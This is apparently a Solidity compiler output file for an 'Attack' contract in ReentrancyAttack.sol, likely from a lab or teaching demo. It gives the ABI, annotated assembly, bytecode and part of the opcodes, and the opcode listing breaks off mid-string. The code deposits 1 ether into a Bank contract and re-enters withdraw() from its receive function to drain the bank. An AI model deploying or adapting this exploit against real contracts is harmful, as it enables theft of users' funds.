{
	"contracts/ReentrancyAttack.sol": {
		"Attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract Bank",
							"name": "_bank",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "bank",
					"outputs": [
						{
							"internalType": "contract Bank",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getBalance",
					"outputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"stateMutability": "view",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"contracts/ReentrancyAttack.sol\":938:1715  contract Attack {... */\n  mstore(0x40, 0x80)\n    /* \"contracts/ReentrancyAttack.sol\":1040:1095  constructor(Bank _bank) {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"contracts/ReentrancyAttack.sol\":1082:1087  _bank */\n  dup1\n    /* \"contracts/ReentrancyAttack.sol\":1075:1079  bank */\n  0x00\n  0x00\n    /* \"contracts/ReentrancyAttack.sol\":1075:1087  bank = _bank */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"contracts/ReentrancyAttack.sol\":1040:1095  constructor(Bank _bank) {... */\n  pop\n    /* \"contracts/ReentrancyAttack.sol\":938:1715  contract Attack {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  0x00\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_21\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:675   */\ntag_12:\n    /* \"#utility.yul\":616:623   */\n  0x00\n    /* \"#utility.yul\":645:669   */\n  tag_23\n    /* \"#utility.yul\":663:668   */\n  dup3\n    /* \"#utility.yul\":645:669   */\n  tag_11\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":634:669   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:675   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":681:825   */\ntag_13:\n    /* \"#utility.yul\":765:800   */\n  tag_25\n    /* \"#utility.yul\":794:799   */\n  dup2\n    /* \"#utility.yul\":765:800   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":758:763   */\n  dup2\n    /* \"#utility.yul\":755:801   */\n  eq\n    /* \"#utility.yul\":745:819   */\n  tag_26\n  jumpi\n    /* \"#utility.yul\":815:816   */\n  0x00\n    /* \"#utility.yul\":812:813   */\n  0x00\n    /* \"#utility.yul\":805:817   */\n  revert\n    /* \"#utility.yul\":745:819   */\ntag_26:\n    /* \"#utility.yul\":681:825   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":831:996   */\ntag_14:\n    /* \"#utility.yul\":899:904   */\n  0x00\n    /* \"#utility.yul\":930:936   */\n  dup2\n    /* \"#utility.yul\":924:937   */\n  mload\n    /* \"#utility.yul\":915:937   */\n  swap1\n  pop\n    /* \"#utility.yul\":946:990   */\n  tag_28\n    /* \"#utility.yul\":984:989   */\n  dup2\n    /* \"#utility.yul\":946:990   */\n  tag_13\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":831:996   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1002:1375   */\ntag_3:\n    /* \"#utility.yul\":1083:1089   */\n  0x00\n    /* \"#utility.yul\":1132:1134   */\n  0x20\n    /* \"#utility.yul\":1120:1129   */\n  dup3\n    /* \"#utility.yul\":1111:1118   */\n  dup5\n    /* \"#utility.yul\":1107:1130   */\n  sub\n    /* \"#utility.yul\":1103:1135   */\n  slt\n    /* \"#utility.yul\":1100:1219   */\n  iszero\n  tag_30\n  jumpi\n    /* \"#utility.yul\":1138:1217   */\n  tag_31\n  tag_8\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1100:1219   */\ntag_30:\n    /* \"#utility.yul\":1258:1259   */\n  0x00\n    /* \"#utility.yul\":1283:1358   */\n  tag_32\n    /* \"#utility.yul\":1350:1357   */\n  dup5\n    /* \"#utility.yul\":1341:1347   */\n  dup3\n    /* \"#utility.yul\":1330:1339   */\n  dup6\n    /* \"#utility.yul\":1326:1348   */\n  add\n    /* \"#utility.yul\":1283:1358   */\n  tag_14\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1273:1358   */\n  swap2\n  pop\n    /* \"#utility.yul\":1229:1368   */\n  pop\n    /* \"#utility.yul\":1002:1375   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"contracts/ReentrancyAttack.sol\":938:1715  contract Attack {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"contracts/ReentrancyAttack.sol\":938:1715  contract Attack {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x12065fe0\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x76cdb03b\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"contracts/ReentrancyAttack.sol\":1267:1274  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/ReentrancyAttack.sol\":1250:1254  bank */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttack.sol\":1242:1263  address(bank).balance */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      balance\n        /* \"contracts/ReentrancyAttack.sol\":1242:1274  address(bank).balance >= 1 ether */\n      lt\n        /* \"contracts/ReentrancyAttack.sol\":1238:1318  if (address(bank).balance >= 1 ether) {... */\n      tag_8\n      jumpi\n        /* \"contracts/ReentrancyAttack.sol\":1291:1295  bank */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttack.sol\":1291:1304  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/ReentrancyAttack.sol\":1291:1306  bank.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_9\n      jumpi\n      revert(0x00, 0x00)\n    tag_9:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_11\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_11:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/ReentrancyAttack.sol\":1238:1318  if (address(bank).balance >= 1 ether) {... */\n    tag_8:\n        /* \"contracts/ReentrancyAttack.sol\":938:1715  contract Attack {... */\n      stop\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"contracts/ReentrancyAttack.sol\":1611:1712  function getBalance() external view returns (uint256) {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      revert(0x00, 0x00)\n    tag_12:\n      pop\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      tag_15\n      swap2\n      swap1\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/ReentrancyAttack.sol\":961:977  Bank public bank */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_17\n      jumpi\n      revert(0x00, 0x00)\n    tag_17:\n      pop\n      tag_18\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      tag_20\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_20:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"contracts/ReentrancyAttack.sol\":1391:1570  function attack() external payable {... */\n    tag_5:\n      tag_22\n      tag_23\n      jump\t// in\n    tag_22:\n      stop\n        /* \"contracts/ReentrancyAttack.sol\":1611:1712  function getBalance() external view returns (uint256) {... */\n    tag_14:\n        /* \"contracts/ReentrancyAttack.sol\":1656:1663  uint256 */\n      0x00\n        /* \"contracts/ReentrancyAttack.sol\":1683:1704  address(this).balance */\n      selfbalance\n        /* \"contracts/ReentrancyAttack.sol\":1676:1704  return address(this).balance */\n      swap1\n      pop\n        /* \"contracts/ReentrancyAttack.sol\":1611:1712  function getBalance() external view returns (uint256) {... */\n      swap1\n      jump\t// out\n        /* \"contracts/ReentrancyAttack.sol\":961:977  Bank public bank */\n    tag_19:\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"contracts/ReentrancyAttack.sol\":1391:1570  function attack() external payable {... */\n    tag_23:\n        /* \"contracts/ReentrancyAttack.sol\":1458:1465  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/ReentrancyAttack.sol\":1445:1454  msg.value */\n      callvalue\n        /* \"contracts/ReentrancyAttack.sol\":1445:1465  msg.value == 1 ether */\n      eq\n        /* \"contracts/ReentrancyAttack.sol\":1437:1495  require(msg.value == 1 ether, \"Require 1 Ether to attack\") */\n      tag_26\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_27\n      swap1\n      tag_28\n      jump\t// in\n    tag_27:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_26:\n        /* \"contracts/ReentrancyAttack.sol\":1506:1510  bank */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttack.sol\":1506:1518  bank.deposit */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xd0e30db0\n        /* \"contracts/ReentrancyAttack.sol\":1526:1533  1 ether */\n      0x0de0b6b3a7640000\n        /* \"contracts/ReentrancyAttack.sol\":1506:1536  bank.deposit{value: 1 ether}() */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      revert(0x00, 0x00)\n    tag_29:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_31\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_31:\n      pop\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/ReentrancyAttack.sol\":1547:1551  bank */\n      0x00\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"contracts/ReentrancyAttack.sol\":1547:1560  bank.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x3ccfd60b\n        /* \"contracts/ReentrancyAttack.sol\":1547:1562  bank.withdraw() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_32\n      jumpi\n      revert(0x00, 0x00)\n    tag_32:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_34\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_34:\n      pop\n      pop\n      pop\n      pop\n        /* \"contracts/ReentrancyAttack.sol\":1391:1570  function attack() external payable {... */\n      jump\t// out\n        /* \"#utility.yul\":7:84   */\n    tag_35:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":73:78   */\n      dup2\n        /* \"#utility.yul\":62:78   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:84   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":90:208   */\n    tag_36:\n        /* \"#utility.yul\":177:201   */\n      tag_49\n        /* \"#utility.yul\":195:200   */\n      dup2\n        /* \"#utility.yul\":177:201   */\n      tag_35\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":172:175   */\n      dup3\n        /* \"#utility.yul\":165:202   */\n      mstore\n        /* \"#utility.yul\":90:208   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":214:436   */\n    tag_16:\n        /* \"#utility.yul\":307:311   */\n      0x00\n        /* \"#utility.yul\":345:347   */\n      0x20\n        /* \"#utility.yul\":334:343   */\n      dup3\n        /* \"#utility.yul\":330:348   */\n      add\n        /* \"#utility.yul\":322:348   */\n      swap1\n      pop\n        /* \"#utility.yul\":358:429   */\n      tag_51\n        /* \"#utility.yul\":426:427   */\n      0x00\n        /* \"#utility.yul\":415:424   */\n      dup4\n        /* \"#utility.yul\":411:428   */\n      add\n        /* \"#utility.yul\":402:408   */\n      dup5\n        /* \"#utility.yul\":358:429   */\n      tag_36\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":214:436   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":442:568   */\n    tag_37:\n        /* \"#utility.yul\":479:486   */\n      0x00\n        /* \"#utility.yul\":519:561   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":512:517   */\n      dup3\n        /* \"#utility.yul\":508:562   */\n      and\n        /* \"#utility.yul\":497:562   */\n      swap1\n      pop\n        /* \"#utility.yul\":442:568   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":574:634   */\n    tag_38:\n        /* \"#utility.yul\":602:605   */\n      0x00\n        /* \"#utility.yul\":623:628   */\n      dup2\n        /* \"#utility.yul\":616:628   */\n      swap1\n      pop\n        /* \"#utility.yul\":574:634   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":640:782   */\n    tag_39:\n        /* \"#utility.yul\":690:699   */\n      0x00\n        /* \"#utility.yul\":723:776   */\n      tag_55\n        /* \"#utility.yul\":741:775   */\n      tag_56\n        /* \"#utility.yul\":750:774   */\n      tag_57\n        /* \"#utility.yul\":768:773   */\n      dup5\n        /* \"#utility.yul\":750:774   */\n      tag_37\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":741:775   */\n      tag_38\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":723:776   */\n      tag_37\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":710:776   */\n      swap1\n      pop\n        /* \"#utility.yul\":640:782   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":788:914   */\n    tag_40:\n        /* \"#utility.yul\":838:847   */\n      0x00\n        /* \"#utility.yul\":871:908   */\n      tag_59\n        /* \"#utility.yul\":902:907   */\n      dup3\n        /* \"#utility.yul\":871:908   */\n      tag_39\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":858:908   */\n      swap1\n      pop\n        /* \"#utility.yul\":788:914   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":920:1057   */\n    tag_41:\n        /* \"#utility.yul\":981:990   */\n      0x00\n        /* \"#utility.yul\":1014:1051   */\n      tag_61\n        /* \"#utility.yul\":1045:1050   */\n      dup3\n        /* \"#utility.yul\":1014:1051   */\n      tag_40\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1001:1051   */\n      swap1\n      pop\n        /* \"#utility.yul\":920:1057   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1063:1216   */\n    tag_42:\n        /* \"#utility.yul\":1161:1209   */\n      tag_63\n        /* \"#utility.yul\":1203:1208   */\n      dup2\n        /* \"#utility.yul\":1161:1209   */\n      tag_41\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":1156:1159   */\n      dup3\n        /* \"#utility.yul\":1149:1210   */\n      mstore\n        /* \"#utility.yul\":1063:1216   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1222:1466   */\n    tag_21:\n        /* \"#utility.yul\":1326:1330   */\n      0x00\n        /* \"#utility.yul\":1364:1366   */\n      0x20\n        /* \"#utility.yul\":1353:1362   */\n      dup3\n        /* \"#utility.yul\":1349:1367   */\n      add\n        /* \"#utility.yul\":1341:1367   */\n      swap1\n      pop\n        /* \"#utility.yul\":1377:1459   */\n      tag_65\n        /* \"#utility.yul\":1456:1457   */\n      0x00\n        /* \"#utility.yul\":1445:1454   */\n      dup4\n        /* \"#utility.yul\":1441:1458   */\n      add\n        /* \"#utility.yul\":1432:1438   */\n      dup5\n        /* \"#utility.yul\":1377:1459   */\n      tag_42\n      jump\t// in\n    tag_65:\n        /* \"#utility.yul\":1222:1466   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1472:1641   */\n    tag_43:\n        /* \"#utility.yul\":1556:1567   */\n      0x00\n        /* \"#utility.yul\":1590:1596   */\n      dup3\n        /* \"#utility.yul\":1585:1588   */\n      dup3\n        /* \"#utility.yul\":1578:1597   */\n      mstore\n        /* \"#utility.yul\":1630:1634   */\n      0x20\n        /* \"#utility.yul\":1625:1628   */\n      dup3\n        /* \"#utility.yul\":1621:1635   */\n      add\n        /* \"#utility.yul\":1606:1635   */\n      swap1\n      pop\n        /* \"#utility.yul\":1472:1641   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1647:1822   */\n    tag_44:\n        /* \"#utility.yul\":1787:1814   */\n      0x52657175697265203120457468657220746f2061747461636b00000000000000\n        /* \"#utility.yul\":1783:1784   */\n      0x00\n        /* \"#utility.yul\":1775:1781   */\n      dup3\n        /* \"#utility.yul\":1771:1785   */\n      add\n        /* \"#utility.yul\":1764:1815   */\n      mstore\n        /* \"#utility.yul\":1647:1822   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1828:2194   */\n    tag_45:\n        /* \"#utility.yul\":1970:1973   */\n      0x00\n        /* \"#utility.yul\":1991:2058   */\n      tag_69\n        /* \"#utility.yul\":2055:2057   */\n      0x19\n        /* \"#utility.yul\":2050:2053   */\n      dup4\n        /* \"#utility.yul\":1991:2058   */\n      tag_43\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":1984:2058   */\n      swap2\n      pop\n        /* \"#utility.yul\":2067:2160   */\n      tag_70\n        /* \"#utility.yul\":2156:2159   */\n      dup3\n        /* \"#utility.yul\":2067:2160   */\n      tag_44\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":2185:2187   */\n      0x20\n        /* \"#utility.yul\":2180:2183   */\n      dup3\n        /* \"#utility.yul\":2176:2188   */\n      add\n        /* \"#utility.yul\":2169:2188   */\n      swap1\n      pop\n        /* \"#utility.yul\":1828:2194   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2200:2619   */\n    tag_28:\n        /* \"#utility.yul\":2366:2370   */\n      0x00\n        /* \"#utility.yul\":2404:2406   */\n      0x20\n        /* \"#utility.yul\":2393:2402   */\n      dup3\n        /* \"#utility.yul\":2389:2407   */\n      add\n        /* \"#utility.yul\":2381:2407   */\n      swap1\n      pop\n        /* \"#utility.yul\":2453:2462   */\n      dup2\n        /* \"#utility.yul\":2447:2451   */\n      dup2\n        /* \"#utility.yul\":2443:2463   */\n      sub\n        /* \"#utility.yul\":2439:2440   */\n      0x00\n        /* \"#utility.yul\":2428:2437   */\n      dup4\n        /* \"#utility.yul\":2424:2441   */\n      add\n        /* \"#utility.yul\":2417:2464   */\n      mstore\n        /* \"#utility.yul\":2481:2612   */\n      tag_72\n        /* \"#utility.yul\":2607:2611   */\n      dup2\n        /* \"#utility.yul\":2481:2612   */\n      tag_45\n      jump\t// in\n    tag_72:\n        /* \"#utility.yul\":2473:2612   */\n      swap1\n      pop\n        /* \"#utility.yul\":2200:2619   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122080505013ccef0c8aa14b116e5fdbe28296a782b5189f115d8cdb403ea40cc63964736f6c634300081e0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f5ffd5b50604051610568380380610568833981810160405281019061003191906100e5565b805f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610110565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b5f6100b482610099565b9050919050565b6100c4816100aa565b81146100ce575f5ffd5b50565b5f815190506100df816100bb565b92915050565b5f602082840312156100fa576100f9610076565b5b5f610107848285016100d1565b91505092915050565b61044b8061011d5f395ff3fe608060405260043610610037575f3560e01c806312065fe01461010457806376cdb03b1461012e5780639e5faafc1461015857610100565b3661010057670de0b6b3a76400005f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106100fe575f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156100e7575f5ffd5b505af11580156100f9573d5f5f3e3d5ffd5b505050505b005b5f5ffd5b34801561010f575f5ffd5b50610118610162565b60405161012591906102f1565b60405180910390f35b348015610139575f5ffd5b50610142610169565b60405161014f9190610384565b60405180910390f35b61016061018d565b005b5f47905090565b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b670de0b6b3a764000034146101d7576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016101ce906103f7565b60405180910390fd5b5f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004015f604051808303818588803b158015610245575f5ffd5b505af1158015610257573d5f5f3e3d5ffd5b50505050505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b81526004015f604051808303815f87803b1580156102c1575f5ffd5b505af11580156102d3573d5f5f3e3d5ffd5b50505050565b5f819050919050565b6102eb816102d9565b82525050565b5f6020820190506103045f8301846102e2565b92915050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f61034c6103476103428461030a565b610329565b61030a565b9050919050565b5f61035d82610332565b9050919050565b5f61036e82610353565b9050919050565b61037e81610364565b82525050565b5f6020820190506103975f830184610375565b92915050565b5f82825260208201905092915050565b7f52657175697265203120457468657220746f2061747461636b000000000000005f82015250565b5f6103e160198361039d565b91506103ec826103ad565b602082019050919050565b5f6020820190508181035f83015261040e816103d5565b905091905056fea264697066735822122080505013ccef0c8aa14b116e5fdbe28296a782b5189f115d8cdb403ea40cc63964736f6c634300081e0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x568 CODESIZE SUB DUP1 PUSH2 0x568 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xE5 JUMP JUMPDEST DUP1 PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x110 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xB4 DUP3 PUSH2 0x99 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xC4 DUP2 PUSH2 0xAA JUMP JUMPDEST DUP2 EQ PUSH2 0xCE JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xDF DUP2 PUSH2 0xBB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFA JUMPI PUSH2 0xF9 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x107 DUP5 DUP3 DUP6 ADD PUSH2 0xD1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x44B DUP1 PUSH2 0x11D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x37 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12065FE0 EQ PUSH2 0x104 JUMPI DUP1 PUSH4 0x76CDB03B EQ PUSH2 0x12E JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x158 JUMPI PUSH2 0x100 JUMP JUMPDEST CALLDATASIZE PUSH2 0x100 JUMPI PUSH8 0xDE0B6B3A7640000 PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0xFE JUMPI PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x3CCFD60B PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE7 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xF9 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x10F JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x118 PUSH2 0x162 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x125 SWAP2 SWAP1 PUSH2 0x2F1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO 